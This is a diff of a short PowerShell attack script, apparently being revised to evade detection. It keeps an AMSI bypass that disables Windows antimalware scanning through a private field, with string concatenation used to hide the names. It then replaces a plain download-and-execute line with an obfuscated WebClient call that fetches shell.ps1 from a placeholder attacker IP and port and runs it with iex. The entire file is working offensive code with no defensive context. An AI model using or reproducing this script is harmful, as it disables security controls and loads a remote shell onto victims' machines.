@@ -1,4 +1,7 @@
 $a = [Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils')
 $b = $a.GetField('amsi'+'InitFailed','NonPublic,Static')
 $b.SetValue($null,$true)
-irm http://$Attack_IP:$PORT/shell.ps1 | iex
+
+$wc = New-Object ('Net.Web'+'Client')
+$code = $wc.('Down'+'loadString')('http://$Attack_ip:$PORT/shell.ps1')
+iex $code
